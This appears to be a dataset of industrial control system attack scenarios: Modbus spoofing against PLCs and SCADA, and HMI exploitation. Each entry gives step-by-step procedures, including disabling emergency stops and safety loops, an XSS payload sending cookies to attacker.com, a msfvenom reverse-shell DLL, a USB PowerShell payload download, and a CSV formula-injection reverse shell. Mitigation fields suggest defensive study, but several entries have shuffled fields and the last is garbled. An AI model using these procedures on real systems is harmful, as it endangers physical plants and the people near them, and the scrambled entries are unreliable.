- **Attack Steps**: Step 1: Map Modbus addresses of all critical devices (valves, pumps, sensors).Step 2: Use Python + Scapy to send fake alarm values to their status registers simultaneously.Step 3: Ensure packets are sent with proper transaction IDs and source IPs.Step 4: All alarms activate across HMI panels.Step 5: Operator initiates emergency shutdown due to perceived disaster.Step 6: Real devices had no faults.
- **Detection**: Panic shutdown, downtime
- **Solution**: Validate alarms with OT monitoring
- **Tags**: Implement layered alarm validation

## Spoofed Register Sync to Desynchronize Redundant PLCs

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: PLC (Redundant)
- **MITRE**: Trust-based register sync
- **Impact**: T0884
- **Tools**: Scapy, Wireshark
- **Scenario**: Attacker sends false sync values between redundant PLCs to create logic conflict.
- **Attack Steps**: Step 1: Identify syncing registers between master/slave PLCs.Step 2: Observe normal values using Wireshark.Step 3: Use Scapy to craft spoofed packets to the slave PLC with inconsistent values.Step 4: Slave processes false input, creating a conflict.Step 5: Redundant logic is broken; one PLC takes unexpected control.Step 6: Monitor for operational mismatch alarms.
- **Detection**: Failover control error
- **Solution**: Redundant controller mismatch logs
- **Tags**: Sync validation via checksum

## Inject Fake Timestamp to Cause Sequence Errors

- **Attack Type**: Modbus Spoofing
- **Target**: ModbusPal, Scapy
- **Vulnerability**: PLC
- **MITRE**: Timestamp not validated
- **Impact**: T0856
- **Tools**: Scapy, ModbusPal
- **Scenario**: Attacker injects false timestamp registers, confusing time-dependent logic.
- **Attack Steps**: Step 1: Find register (e.g., 40050) holding timestamps or execution order.Step 2: Craft spoofed Modbus Write packet with out-of-sequence time.Step 3: Inject the value via Scapy into PLC logic processor.Step 4: PLC misorders process steps (e.g., closing valve before draining tank).Step 5: Monitor for logic sequence error or safety trip.Step 6: Logs show execution with tampered timestamps.
- **Detection**: Process error or overflow
- **Solution**: Compare time deltas, audit trail
- **Tags**: Use internal clocks not field inputs

## HMI Spoof to Reassign Sensor Mapping

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: Unauthenticated mapping control
- **Impact**: T0884
- **Tools**: Scapy, ModScan
- **Scenario**: An attacker impersonates HMI and changes sensor-to-register mapping.
- **Attack Steps**: Step 1: Discover mapping register (e.g., sensor X mapped to address 40001).Step 2: Craft Write Register packet with a new mapping (e.g., redirect to fake sensor).Step 3: Spoof IP of authorized HMI.Step 4: PLC applies new mapping without verification.Step 5: Operator sees clean sensor readings from fake source.Step 6: Actual sensor data is ignored.
- **Detection**: Sensor spoof and logic misroute
- **Solution**: Use static, hard-coded map tables
- **Tags**: Prevent field-based remapping

## Modbus Spoof with Intentional CRC Errors

- **Attack Type**: Modbus Spoofing / DoS
- **Target**: Scapy, Python
- **Vulnerability**: PLC
- **MITRE**: No rate-limit on bad packets
- **Impact**: T0814
- **Tools**: Python, Scapy
- **Scenario**: Attacker sends malformed Modbus packets with bad CRCs to overload error handlers.
- **Attack Steps**: Step 1: Construct Modbus packets using Scapy.Step 2: Deliberately insert incorrect CRC in each packet.Step 3: Send packets rapidly to PLC.Step 4: PLC logs flood with CRC errors.Step 5: Some devices crash or stop responding after buffer overflows.Step 6: Admin must clear errors manually.
- **Detection**: Device crash / resource exhaustion
- **Solution**: Monitor CRC failure rates
- **Tags**: Drop malformed packets at firewall

## Spoof Modbus ID to Hijack Another Slave's Role

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: PLC / HMI
- **MITRE**: No ID conflict protection
- **Impact**: T0855
- **Tools**: Wireshark, Scapy
- **Scenario**: Attacker uses same Unit ID as an existing PLC to impersonate it in traffic.
- **Attack Steps**: Step 1: Use Wireshark to capture Modbus traffic and identify a Unit ID (e.g., 0x05).Step 2: Craft Modbus responses using the same Unit ID.Step 3: Inject spoofed responses to overwrite actual data.Step 4: HMI accepts wrong responses thinking it’s from legit PLC.Step 5: Real PLC gets ignored due to mismatch timing.Step 6: Operator sees wrong process data.
- **Detection**: Identity clash, HMI confusion
- **Solution**: Monitor unexpected Unit ID conflicts
- **Tags**: Secure device ID registration

## Trick SCADA into Thinking Backup Systems Are Online

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, ModbusPal
- **Vulnerability**: SCADA System
- **MITRE**: No validation of backup status
- **Impact**: T0856
- **Tools**: Scapy, ModbusPal
- **Scenario**: Send spoofed status responses from inactive backup systems to SCADA.
- **Attack Steps**: Step 1: Observe normal backup status registers (e.g., 40030 = 1 means active).Step 2: Craft forged response from backup PLC to show it is “healthy”.Step 3: SCADA dashboard shows green status for backup.Step 4: Primary fails, and backup does not take over because it’s fake.Step 5: System halts without backup taking over.Step 6: Logs show backup was never really connected.
- **Detection**: Loss of redundancy, unexpected outage
- **Solution**: Validate backup via heartbeat
- **Tags**: Secure heartbeat and monitoring

## Delay Real Sensor Values Using Spoofed Responses

- **Attack Type**: Modbus Spoofing
- **Target**: Ettercap, Scapy
- **Vulnerability**: SCADA / HMI
- **MITRE**: No timestamp validation
- **Impact**: T0856
- **Tools**: Ettercap, Scapy
- **Scenario**: Attacker intercepts and delays actual sensor responses, replacing them temporarily with fake normal values.
- **Attack Steps**: Step 1: Use Ettercap to become MITM between PLC and SCADA.Step 2: Capture legitimate sensor responses and hold them.Step 3: Replace with spoofed “normal” readings using Scapy.Step 4: After delay, forward real packet to avoid suspicion.Step 5: HMI sees data that lags reality, possibly missing real-time events.Step 6: Danger escalates before alarm shows.
- **Detection**: Hidden hazard delay
- **Solution**: Compare timestamps with real time
- **Tags**: Use signed + timestamped packets

## Emergency Stop Override via Forged Register

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: E-Stop override not protected
- **Impact**: T0856
- **Tools**: ModScan, Scapy
- **Scenario**: Attacker disables E-Stop logic by overwriting the status register.
- **Attack Steps**: Step 1: Identify E-Stop status register (e.g., 40060 = 1 = enabled).Step 2: Craft Modbus packet setting it to 0 (disabled).Step 3: Spoof source IP of authorized configuration tool.Step 4: Send to PLC before operator presses real E-Stop.Step 5: Emergency stop has no effect.Step 6: Safety protocol fails silently.
- **Detection**: Safety shutdown fails
- **Solution**: Monitor control flow of E-Stop logic
- **Tags**: Lock E-Stop behind signed firmware

## Spoof Network-Wide Broadcast to Trigger False Reset

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Python
- **Vulnerability**: Multiple PLCs
- **MITRE**: Broadcast packets accepted
- **Impact**: T0884
- **Tools**: Scapy, Python
- **Scenario**: Attacker sends a spoofed broadcast packet triggering reset across all Modbus devices.
- **Attack Steps**: Step 1: Craft Modbus TCP broadcast frame using Unit ID 0 (broadcast).Step 2: Function Code 8 (diagnostics) or reset function is embedded.Step 3: Send to 255.255.255.255 or subnet-wide IP range.Step 4: All PLCs that accept broadcast reset and lose current states.Step 5: Operator sees synchronized drop of all ICS devices.Step 6: Factory halts unexpectedly.
- **Detection**: ICS-wide reset
- **Solution**: Block broadcast frames to ICS net
- **Tags**: Disable broadcast response in PLC

## Spoofed Login Events to HMI Logs

- **Attack Type**: Modbus Spoofing
- **Target**: HMI Simulator, Scapy
- **Vulnerability**: HMI
- **MITRE**: Log not integrity-protected
- **Impact**: T0856
- **Tools**: Scapy, HMI Simulator
- **Scenario**: Attacker injects forged login audit entries into HMI log register area.
- **Attack Steps**: Step 1: Determine audit log register block in HMI (e.g., 42000-42050).Step 2: Craft Modbus write packets with strings like “Admin Login - 02:30 AM”.Step 3: Write data into registers using Function Code 16 (write multiple).Step 4: Spoof from internal admin IP to avoid suspicion.Step 5: Forensics team sees tampered logs.Step 6: Legit admin unaware of the falsified log entries.
- **Detection**: False audit trail
- **Solution**: Use secure external logging server
- **Tags**: Add tamper-evident logging

## Forge Status to Prevent Alarm Acknowledgement

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Wireshark
- **Vulnerability**: HMI
- **MITRE**: No validation for alarm status
- **Impact**: T0856
- **Tools**: Scapy, Wireshark
- **Scenario**: Spoofed data shows alarm as already acknowledged to prevent operator reaction.
- **Attack Steps**: Step 1: Identify alarm acknowledgement register (e.g., 40100 = 0 for unacknowledged).Step 2: Craft spoofed response with 1 (acknowledged).Step 3: Inject response to HMI before operator can acknowledge.Step 4: Alarm appears acknowledged and disappears.Step 5: Underlying issue remains unaddressed.Step 6: Logs mislead forensic review.
- **Detection**: Critical alert ignored
- **Solution**: Alert correlation logs
- **Tags**: Cryptographically signed Modbus

## SCADA Logic Misfire via Partial Register Spoof

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Python
- **Vulnerability**: SCADA logic
- **MITRE**: Assumes full register sync
- **Impact**: T0856
- **Tools**: Scapy, Python
- **Scenario**: Only part of multi-register data is spoofed, causing logic engine errors.
- **Attack Steps**: Step 1: Identify a multi-register block (e.g., pressure data across 40010–40012).Step 2: Spoof only 40010 with incorrect value.Step 3: Logic engine attempts math operations across invalid/incomplete dataset.Step 4: Calculation fails or outputs error.Step 5: HMI shows invalid value or drops to fail-safe.Step 6: Operator confused by false fault.
- **Detection**: Logic failure / false fault
- **Solution**: Checksum across register blocks
- **Tags**: Validate completeness of data

## Spoofed Modbus Config Changes to Induce Overwrite

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: Open config register access
- **Impact**: T0884
- **Tools**: ModScan, Scapy
- **Scenario**: Spoofed config packets rewrite critical control logic registers.
- **Attack Steps**: Step 1: Identify where PLC config parameters are stored (e.g., PID control constants).Step 2: Craft a Modbus write command to change Kp/Ki/Kd values.Step 3: Spoof source IP as engineering workstation.Step 4: PLC accepts altered parameters.Step 5: Process behaves unpredictably.Step 6: Reverting requires manual intervention.
- **Detection**: Process deviation / safety risk
- **Solution**: Monitor config changes in real-time
- **Tags**: Lock config changes via HMI only

## Insert Rogue Register for Logic Hijacking

- **Attack Type**: Modbus Spoofing
- **Target**: ModbusPal, Scapy
- **Vulnerability**: SCADA Logic
- **MITRE**: No strict register whitelist
- **Impact**: T0856
- **Tools**: Scapy, ModbusPal
- **Scenario**: An attacker injects new fake register into the SCADA logic chain.
- **Attack Steps**: Step 1: Find unused register space in logic engine (e.g., 40150).Step 2: Write a spoofed value that alters logic conditions (e.g., emergency override = TRUE).Step 3: Spoof source as internal network sensor.Step 4: Logic reroutes output flow or disables alarm.Step 5: SCADA system trusts false condition.Step 6: Hard to detect unless register audit is done.
- **Detection**: Unauthorized logic injection
- **Solution**: Baseline monitoring of active registers
- **Tags**: Reject writes to unknown registers

## Spoofed Command Burst to Exhaust PLC Thread Pool

- **Attack Type**: Modbus Spoofing / DoS
- **Target**: Python, Scapy
- **Vulnerability**: PLC
- **MITRE**: Thread pool exhaustion
- **Impact**: T0814
- **Tools**: Python, Scapy
- **Scenario**: Rapid spoofed Modbus commands fill PLC’s request handler threads.
- **Attack Steps**: Step 1: Identify maximum concurrent request threads (e.g., 8 on test PLC).Step 2: Use script to send 20 spoofed write commands in rapid succession.Step 3: PLC queues overflow or drops packets.Step 4: System delays or freezes briefly.Step 5: Devices appear offline to HMI.Step 6: Effects vanish after timeout.
- **Detection**: Delay, slow operations
- **Solution**: Detect abnormal request rate
- **Tags**: Rate limit + thread protection

## Override PLC State via Spoofed Reset Register

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Scapy
- **Vulnerability**: PLC
- **MITRE**: No source authentication
- **Impact**: T0884
- **Tools**: ModScan, Scapy
- **Scenario**: Attacker resets PLC internal state by spoofing control word.
- **Attack Steps**: Step 1: Identify the control register that resets internal state (e.g., 40099 = 1 = Reset).Step 2: Craft Modbus packet writing 1 to that register.Step 3: Send spoofed packet from trusted engineering station IP.Step 4: PLC resets to initial state mid-process.Step 5: Active operations stop suddenly.Step 6: HMI logs show reset with no explanation.
- **Detection**: Process resets abruptly
- **Solution**: Monitor reset register access
- **Tags**: Lock reset registers with privilege

## Spoofed Safety Loop Bypass Using Low Priority Packet

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy
- **Vulnerability**: PLC
- **MITRE**: Misuse of secondary registers
- **Impact**: T0856
- **Tools**: Scapy
- **Scenario**: Attacker crafts a low-priority packet to disable safety loop via alternate register.
- **Attack Steps**: Step 1: Find low-priority registers unused by primary control loop.Step 2: Craft a write to safety bypass register (e.g., 40110 = 1 disables checks).Step 3: Send it during maintenance hours.Step 4: System enters unsafe state unnoticed.Step 5: Process continues without critical safety trip.Step 6: Potential for damage if undetected.
- **Detection**: Safety mechanisms ignored
- **Solution**: Validate changes to critical flags
- **Tags**: Use only approved control register list

## Hijack Remote Update Process with Spoofed Data

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: PLC
- **MITRE**: No packet integrity checks
- **Impact**: T0856
- **Tools**: Scapy, Wireshark
- **Scenario**: During configuration update, attacker spoofs a packet to inject malicious value.
- **Attack Steps**: Step 1: Observe ongoing update sequence between engineering station and PLC.Step 2: Spoof one Modbus packet mid-stream with an altered value.Step 3: PLC accepts the change as part of update.Step 4: Engineering station unaware of injected config.Step 5: Process changes upon restart.Step 6: Tampered value leads to incorrect execution.
- **Detection**: Faulty reconfiguration
- **Solution**: Log hash of config values
- **Tags**: Use signed updates

## Trigger Alarm Flood via Repetitive Spoofed Alerts

- **Attack Type**: Modbus Spoofing
- **Target**: Python, Scapy
- **Vulnerability**: HMI
- **MITRE**: No source validation for alerts
- **Impact**: T0814
- **Tools**: Python, Scapy
- **Scenario**: Attacker sends fake alarm register values repeatedly to overwhelm operator.
- **Attack Steps**: Step 1: Identify alarm flag register (e.g., 42020 = 1 = active alarm).Step 2: Use Python to loop and send spoofed alarm packets every second.Step 3: HMI keeps registering fake alarms.Step 4: Operator overwhelmed by alert flood.Step 5: Real alarms are buried under noise.Step 6: Operator disables alarm interface.
- **Detection**: Alert fatigue / real events missed
- **Solution**: Correlate alerts with device IDs
- **Tags**: Limit alarm generation per source

## Spoofed HMI Menu Access to Mislead Operators

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, ModbusPal
- **Vulnerability**: HMI
- **MITRE**: GUI logic tied to spoofable data
- **Impact**: T0856
- **Tools**: Scapy, ModbusPal
- **Scenario**: Attacker injects forged register to make a control option appear available in HMI.
- **Attack Steps**: Step 1: Identify HMI display logic tied to a flag register (e.g., 43000 = 1 = enable menu).Step 2: Spoof packet writing 1 to that register.Step 3: HMI now displays a control feature that shouldn't exist.Step 4: Operator unknowingly interacts with this phantom feature.Step 5: Actions appear to succeed but do nothing.Step 6: Confusion or misuse of process results.
- **Detection**: Operator misled, process altered
- **Solution**: Bind GUI state to logic engine, not registers
- **Tags**: Restrict HMI flags to signed data

## Spoofed Setpoint Adjustment During Calibration

- **Attack Type**: Modbus Spoofing
- **Target**: ModScan, Wireshark, Scapy
- **Vulnerability**: PLC
- **MITRE**: No integrity check on config writes
- **Impact**: T0884
- **Tools**: ModScan, Scapy
- **Scenario**: Attacker injects a fake setpoint value during device calibration, changing control behavior permanently.
- **Attack Steps**: Step 1: Use ModScan to find register for setpoint (e.g., 40080 = target pressure).Step 2: Wait for calibration session to start (monitored via Wireshark).Step 3: Inject a spoofed Modbus packet writing a new value (e.g., increase pressure setpoint).Step 4: Spoof IP as calibration engineer.Step 5: PLC stores and uses fake setpoint.Step 6: Process behavior is altered permanently.
- **Detection**: Control deviation, unsafe state
- **Solution**: Log and verify config changes during calibration
- **Tags**: Signed config snapshots

## Stealth Stop Command on Output Relay

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Python
- **Vulnerability**: PLC
- **MITRE**: No write audit logging
- **Impact**: T0855
- **Tools**: Scapy, Python
- **Scenario**: Sends spoofed “Stop” command to output coil controlling an actuator, disguised as regular status check.
- **Attack Steps**: Step 1: Identify control coil (e.g., 00020 = actuator ON/OFF).Step 2: Use Scapy to craft a write coil (Function Code 5) with value 0 (OFF).Step 3: Embed packet inside burst of normal Modbus read packets.Step 4: Inject at same interval as polling traffic.Step 5: Actuator stops silently; operator assumes it’s system glitch.Step 6: Misleading log shows "status read," not command.
- **Detection**: Silent actuator stop
- **Solution**: Monitor writes in read-heavy traffic
- **Tags**: Isolate control and status registers

## Insert Delayed Control Change via Spoofed Queued Packet

- **Attack Type**: Modbus Spoofing
- **Target**: Python sched, Scapy
- **Vulnerability**: PLC
- **MITRE**: No alert for timed writes
- **Impact**: T0884
- **Tools**: Python (sched), Scapy
- **Scenario**: Spoofed packet is timed to execute after a delay, bypassing operator review.
- **Attack Steps**: Step 1: Identify critical control register (e.g., 40033 = valve open/close).Step 2: Write Python script with sched module to schedule spoofed write after operator shift ends.Step 3: At off-hour time, send spoofed Modbus Write packet.Step 4: Register updated without operator presence.Step 5: Change occurs unexpectedly.Step 6: Incident seems accidental due to lack of trace.
- **Detection**: Unexplained state change
- **Solution**: Monitor write timestamps
- **Tags**: Use real-time change notifications

## Force False Redundant System Takeover

- **Attack Type**: Modbus Spoofing
- **Target**: Wireshark, Scapy
- **Vulnerability**: Backup PLC
- **MITRE**: No cryptographic validation of health status
- **Impact**: T0884
- **Tools**: Wireshark, Scapy
- **Scenario**: Spoofed register makes redundant backup system think primary failed, initiating takeover.
- **Attack Steps**: Step 1: Monitor heartbeat or health status register (e.g., 40005 = 1 = primary healthy).Step 2: Craft spoofed write with value 0 (failure).Step 3: Send from a spoofed network sensor IP.Step 4: Backup PLC activates automatically.Step 5: Two PLCs now operate in parallel or conflict.Step 6: Control war occurs, possibly causing equipment damage.
- **Detection**: Conflict in control plane
- **Solution**: Check for dual control activity
- **Tags**: Use signed and encrypted control syncs

## Inject Spoofed Heartbeat to Prevent Device Timeout

- **Attack Type**: Modbus Spoofing
- **Target**: Scapy, Python
- **Vulnerability**: SCADA System
- **MITRE**: Heartbeat not authenticated
- **Impact**: T0884
- **Tools**: Scapy, Python
- **Scenario**: Sends spoofed heartbeat packet to fake device activity, keeping a failed PLC from being marked offline.
- **Attack Steps**: Step 1: Identify Modbus device heartbeat interval (e.g., every 10s on register 43000).Step 2: When PLC is physically offline, use Python loop to send crafted “I’m alive” values.Step 3: SCADA system still sees register updates.Step 4: Device never flagged offline.Step 5: Control center unaware of actual outage.Step 6: Backup system never triggers.
- **Detection**: False availability, loss of redundancy
- **Solution**: Compare heartbeat to real traffic source
- **Tags**: Cryptographically secure heartbeat

## Unauthorized Remote Access via Insecure VNC on HMI

- **Attack Type**: HMI Exploitation
- **Target**: HMI Terminal
- **Vulnerability**: Insecure VNC Configuration (no password)
- **MITRE**: T1021.001
- **Impact**: Full system control, risk to physical processes
- **Tools**: Shodan, VNC Viewer
- **Scenario**: Attacker discovers an HMI panel exposed to the internet with default VNC access, allowing full control without a password.
- **Attack Steps**: Step 1: Use Shodan to search for HMIs with open VNC ports (port:5900).Step 2: Identify IPs with manufacturer banners such as Siemens or Allen-Bradley.Step 3: Launch a VNC Viewer (like RealVNC or TightVNC) and try connecting to the target IP.Step 4: If prompted, try default credentials or empty password.Step 5: Upon successful connection, interact with the HMI interface—observe SCADA processes, try issuing test commands (e.g., toggle pump on/off).Step 6: Record any anomalies or safety risks resulting from control abuse.
- **Detection**: Monitor VNC login attempts; track remote desktop connections
- **Solution**: Disable VNC or require strong passwords; isolate HMIs from public internet
- **Tags**: VNC, HMI, ICS, Remote Access

## Credential Harvesting via HMI Phishing Page

- **Attack Type**: HMI Exploitation
- **Target**: HMI Web Interface
- **Vulnerability**: Lack of HTTPS, no phishing protection
- **MITRE**: T1566.002
- **Impact**: Unauthorized access, data tampering
- **Tools**: SEToolkit, Apache, MITMProxy
- **Scenario**: The attacker clones a legitimate HMI web interface (HTML-based) to trick operators into entering credentials.
- **Attack Steps**: Step 1: Use reconnaissance to find HMI login portals over HTTP.Step 2: Clone the interface using tools like SEToolkit’s website cloner.Step 3: Host the fake HMI on a local Apache server (e.g., http://192.168.1.100/hmi).Step 4: Perform ARP spoofing with MITMProxy to redirect internal HMI traffic to attacker’s server.Step 5: Wait for an operator to access the fake portal and enter credentials.Step 6: Capture login details, use them to access real HMI panel, then try issuing process-altering commands.
- **Detection**: Network sniffing, HMI login audit logs
- **Solution**: Use HTTPS for HMI access; train operators on phishing
- **Tags**: Phishing, ARP Spoofing, ICS

## DLL Sideloading in HMI Engineering Software

- **Attack Type**: HMI Exploitation
- **Target**: Engineering Workstation
- **Vulnerability**: DLL Sideloading (Uncontrolled Search Path)
- **MITRE**: T1574.002
- **Impact**: Compromise of HMI configuration and logic
- **Tools**: Process Monitor, msfvenom, CFF Explorer
- **Scenario**: Attacker targets an engineer’s workstation with installed HMI design tools like WinCC, exploiting DLL sideloading.
- **Attack Steps**: Step 1: Identify HMI software installed (e.g., Siemens WinCC).Step 2: Use ProcMon to check for DLLs loaded from insecure directories.Step 3: Craft a malicious DLL using msfvenom with a reverse shell payload.Step 4: Replace a missing or weakly verified DLL in the application folder (e.g., libcrypto.dll).Step 5: Wait for the engineer to launch the HMI editor; the malicious DLL gets loaded.Step 6: Remote shell is opened to attacker’s system, allowing modification of HMI projects or logic.
- **Detection**: Monitor DLL loads; enable AppLocker
- **Solution**: Verify DLL paths; enforce code signing
- **Tags**: WinCC, DLL Hijack, SCADA

## Cross-Site Scripting in Web-Based HMI

- **Attack Type**: HMI Exploitation
- **Target**: HMI Web Panel
- **Vulnerability**: Input not sanitized (stored XSS)
- **MITRE**: T1059.007
- **Impact**: Session hijack, HMI control takeover
- **Tools**: Burp Suite, Firefox
- **Scenario**: A vulnerable HMI allows input fields that reflect user input without sanitization, enabling stored XSS.
- **Attack Steps**: Step 1: Locate input forms on the HMI web interface (e.g., alarm name, description).Step 2: Use Burp Suite to intercept form submission and inject payload: <script>alert('Hacked')</script>.Step 3: Submit the input and reload the interface to see if the script executes.Step 4: If successful, escalate to steal session cookies via <script>fetch('http://attacker.com/'+document.cookie)</script>.Step 5: Use stolen session tokens to impersonate authenticated users and issue control commands.Step 6: Document affected modules (alarms, logs, status displays).
- **Detection**: Web logs, suspicious input fields
- **Solution**: Use input sanitization, WAF
- **Tags**: Web HMI, XSS, ICS

## Exploiting Outdated HMI Firmware for RCE

- **Attack Type**: HMI Exploitation
- **Target**: Embedded HMI Device
- **Vulnerability**: Outdated firmware with known CVE
- **MITRE**: T1203
- **Impact**: Full device takeover
- **Tools**: Nmap, Exploit-DB, Metasploit
- **Scenario**: Attacker finds an HMI with outdated firmware that has known remote code execution vulnerability.
- **Attack Steps**: Step 1: Use Nmap to scan local subnet for HMI devices (e.g., port 80, 502).Step 2: Identify manufacturer and model via banner or web interface (e.g., Weintek, Red Lion).Step 3: Search Exploit-DB for matching CVEs or RCE exploits (e.g., CVE-2020-6994).Step 4: Launch Metasploit with the appropriate exploit module.Step 5: Execute payload and gain a shell on the HMI device.Step 6: Issue commands to modify PLC values, change HMI visuals, or initiate DoS.
- **Detection**: Monitor firmware version logs
- **Solution**: Apply vendor firmware updates
- **Tags**: RCE, HMI Exploit, ICS CVEs

## ARP Spoofing to Capture HMI Traffic

- **Attack Type**: HMI Exploitation
- **Target**: HMI & PLC
- **Vulnerability**: No segmentation, plaintext traffic
- **MITRE**: T1040
- **Impact**: Traffic interception, credential theft
- **Tools**: Wireshark, Bettercap
- **Scenario**: Attacker captures sensitive communication between operator HMI and PLC by performing ARP spoofing on internal network.
- **Attack Steps**: Step 1: Use ipconfig or ifconfig to find attacker's IP and subnet.Step 2: Use nmap -sn 192.168.1.0/24 to identify active hosts including HMI and PLC.Step 3: Launch Bettercap with sudo bettercap -iface eth0.Step 4: Use Bettercap commands to spoof ARP for HMI and PLC (set arp.spoof.targets 192.168.1.10,192.168.1.20 → arp.spoof on).Step 5: Enable packet sniffer in Bettercap (net.sniff on).Step 6: Observe captured packets in Wireshark; filter by Modbus/TCP or HTTP.Step 7: Extract credentials, process values, or command messages for further misuse.
- **Detection**: Monitor ARP tables, packet captures
- **Solution**: VLAN segmentation, encrypted protocols
- **Tags**: ARP Spoofing, ICS, MITM

## Exploiting HMI Mobile App for API Abuse

- **Attack Type**: HMI Exploitation
- **Target**: HMI Mobile Interface
- **Vulnerability**: Unauthenticated APIs
- **MITRE**: T1190
- **Impact**: Command injection, denial of service
- **Tools**: APKTool, Postman, Burp Suite
- **Scenario**: HMI mobile app uses unauthenticated API endpoints for SCADA interaction, allowing command abuse.
- **Attack Steps**: Step 1: Download HMI vendor’s mobile app APK (e.g., from Google Play).Step 2: Decompile using apktool d app.apk.Step 3: Locate API endpoint URLs in smali or XML files (e.g., /api/control or /login).Step 4: Open Postman or Burp and replicate request with valid parameters (e.g., {"pump": "ON"}).Step 5: Send crafted request to internal HMI API server.Step 6: Observe if command executes without authentication or token.Step 7: Try additional requests like {"alarm_reset": true} or "temp": 999.
- **Detection**: Log abnormal API calls, IP origin
- **Solution**: Add API authentication and rate-limiting
- **Tags**: ICS API, Mobile HMI

## Memory Injection via HMI Runtime Executable

- **Attack Type**: HMI Exploitation
- **Target**: HMI Workstation
- **Vulnerability**: No runtime integrity checks
- **MITRE**: T1055
- **Impact**: Display manipulation, operator deception
- **Tools**: Process Hacker, Cheat Engine
- **Scenario**: Attacker modifies HMI process memory at runtime to change screen values without server validation.
- **Attack Steps**: Step 1: Locate and open the HMI runtime executable (e.g., HMI.exe) on Windows.Step 2: Launch Process Hacker and find HMI process PID.Step 3: Use Cheat Engine to attach to the process and scan for known screen values (e.g., “Temperature: 70”).Step 4: Replace values with fake ones like “Temperature: 25” in memory.Step 5: Observe the HMI interface updating to reflect tampered readings.Step 6: Capture operator response and test if critical alarms are triggered or suppressed.
- **Detection**: Memory monitoring, hash validation
- **Solution**: Use signed binaries; prevent memory tampering
- **Tags**: Runtime Injection, HMI Tamper

## USB Malware Delivery to Engineering HMI

- **Attack Type**: HMI Exploitation
- **Target**: Engineering HMI Terminal
- **Vulnerability**: Lack of USB port control
- **MITRE**: T1204.002
- **Impact**: Remote control, sabotage
- **Tools**: Rubber Ducky, Empire, Windows Defender
- **Scenario**: A malicious USB is used to install backdoor in an isolated HMI station using social engineering.
- **Attack Steps**: Step 1: Program a Rubber Ducky script to open PowerShell and download payload (Invoke-WebRequest).Step 2: Insert USB into HMI station during physical access or plant tour.Step 3: Payload downloads and installs Empire agent.Step 4: Attacker receives reverse shell.Step 5: Enumerate HMI application paths and SCADA configs.Step 6: Exfiltrate screenshots and tamper with HMI project files.Step 7: Optionally schedule persistent script to re-enable backdoor.
- **Detection**: Monitor USB events and script execution
- **Solution**: Disable USB or enforce device control policy
- **Tags**: USB Attack, ICS Malware

## HMI Log File Poisoning for Log Deception

- **Attack Type**: HMI Exploitation
- **Target**: HMI Log Server
- **Vulnerability**: Unprotected log file access
- **MITRE**: T1565.001
- **Impact**: Forensic evasion, fake evidence
- **Tools**: Notepad++, WinSCP, Sysinternals
- **Scenario**: Attacker manipulates HMI log files to hide malicious commands and fake normal operations.
- **Attack Steps**: Step 1: Use WinSCP to access HMI log folder via SMB or SFTP (if open).Step 2: Download log file (e.g., operation_log.txt).Step 3: Open with Notepad++, edit timestamped entries to fake operator actions.Step 4: Remove records of unauthorized access (e.g., "User guest issued command: pump off").Step 5: Save and upload modified log back to the system.Step 6: Restart logging service using PsExec to avoid detection.Step 7: Test system alarms to ensure logs reflect false state.
- **Detection**: Compare logs with network telemetry
- **Solution**: Secure log storage, integrity checks
- **Tags**: ICS Logs, File Poisoning

## Visual Element Substitution via HMI Project Editor

- **Attack Type**: HMI Exploitation
- **Target**: HMI Design Software
- **Vulnerability**: Lack of asset validation
- **MITRE**: T1566.001
- **Impact**: Operator misjudgment, overflow
- **Tools**: WinCC, Inkscape, GIMP
- **Scenario**: Attacker modifies graphical interface of HMI project (e.g., tank level gauge) to mislead operator.
- **Attack Steps**: Step 1: Access HMI development environment (e.g., Siemens WinCC on engineer PC).Step 2: Locate graphic assets (e.g., Tank_Full.svg).Step 3: Open in Inkscape or GIMP and edit visual (e.g., make empty tank look full).Step 4: Save and replace original image in HMI project.Step 5: Deploy project to live HMI runtime.Step 6: Operator views misleading visuals, unaware of real status.Step 7: Test impact by simulating overfill without alarm triggering.
- **Detection**: Manual inspection, asset diff
- **Solution**: Asset checksums, review visual elements
- **Tags**: HMI Visualization, ICS

## HMI Session Replay via Captured Tokens

- **Attack Type**: HMI Exploitation
- **Target**: HMI Web Session
- **Vulnerability**: No session expiration or binding
- **MITRE**: T1078
- **Impact**: Session hijack, privilege misuse
- **Tools**: Burp Suite, Wireshark
- **Scenario**: Captured session tokens reused to impersonate authorized users and control SCADA logic.
- **Attack Steps**: Step 1: Use Wireshark to capture HTTP traffic between HMI and server.Step 2: Filter for Set-Cookie headers or Authorization tokens.Step 3: Copy captured session token (e.g., JSESSIONID=XYZ).Step 4: Use Burp Suite to manually inject the token into new browser request.Step 5: Access authenticated interface without credentials.Step 6: Test control functionality (e.g., toggling outputs).Step 7: Validate if session expires or remains valid.
- **Detection**: Log unusual session activity
- **Solution**: Use HTTPS, short-lived tokens
- **Tags**: ICS Session Hijack

## Insecure File Upload in Web HMI

- **Attack Type**: HMI Exploitation
- **Target**:  /C calc'!A0).<br>**Step 3:** Upload using OWASP ZAP or web browser.<br>**Step 4:** Observe execution of payload upon parsing.<br>**Step 5:** Use Netcat` to open reverse shell listener and connect back.Step 6: Escalate access by navigating the file system or modifying HMI configs.
- **Vulnerability**: Web HMI
- **MITRE**: Poor file validation
- **Impact**: T1203
- **Tools**: OWASP ZAP, Netcat, Python
- **Scenario**: Web-based HMI allows file upload for alarms or configurations without proper validation.
- **Attack Steps**: Step 1: Access upload feature on HMI interface (e.g., for alarm CSV).Step 2: Craft a malicious .csv file with embedded formula or shell command (e.g., `=cmd
- **Detection**: Remote code execution
- **Solution**: Monitor uploaded file behavior
- **Tags**: Validate file type, sandbox uploads

